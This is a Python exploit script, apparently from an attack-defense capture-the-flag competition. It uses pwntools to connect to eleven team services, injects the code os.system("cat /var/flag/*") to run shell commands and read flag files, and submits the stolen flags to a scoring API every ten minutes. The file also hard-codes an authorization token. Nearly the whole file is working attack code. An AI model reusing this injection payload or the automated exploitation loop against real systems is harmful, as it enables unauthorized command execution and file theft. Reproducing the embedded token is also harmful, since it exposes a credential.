import requests
import multiprocessing
from time import sleep
from pwn import *

context.log_level = "error"


def exploit(team: str = 10):
    try:
        port = 12000
        ip = "172.31.2.4"
        r = remote(ip, port + team)
        r.recvuntil(": ")
        r.sendline("""os.system("cat /var/flag/*")""")
        flag = r.recvuntil("}")
        return flag.decode('utf8')
    except (EOFError):
        return ""


def submit(flag: str):
    headers = {
        "Authorization": "mtUJh44ViZCilVOh_QMvdoSpcoSxURLU_wcrQuq_-sFFFHR_aw7mMQ"}
    with requests.Session() as s:
        r = s.post("http://172.31.1.1/api/flag/submit", json={
            "flag": flag
        }, headers=headers)
        # print(r)
        return str(r.text)


def main():
    ticks = 10 * 60
    while True:
        with multiprocessing.Pool() as p:
            flags = p.map(exploit, range(1, 12))

        flags = list(set(flags))
        flags.remove("")
        # print(type(flags[0]))
        print(flags)

        with multiprocessing.Pool() as p:
            response = p.map(submit, flags)

        print(response)
        sleep(ticks)


if __name__ == "__main__":
    main()
